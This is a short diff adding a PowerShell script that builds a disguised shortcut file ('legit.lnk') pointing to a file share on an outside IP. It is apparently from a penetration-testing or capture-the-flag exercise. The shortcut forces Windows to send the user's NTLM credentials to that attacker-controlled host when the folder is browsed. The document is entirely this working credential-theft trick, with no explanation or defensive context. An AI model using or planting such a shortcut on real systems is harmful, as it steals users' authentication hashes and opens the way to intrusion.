@@ -1,0 +1,5 @@
+$objShell = New-Object -ComObject WScript.Shell
+$lnk = $objShell.CreateShortcut("C:\legit.lnk")
+$lnk.TargetPath = "\\10.10.14.25\@pwn.png"
+$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
+$lnk.Save()
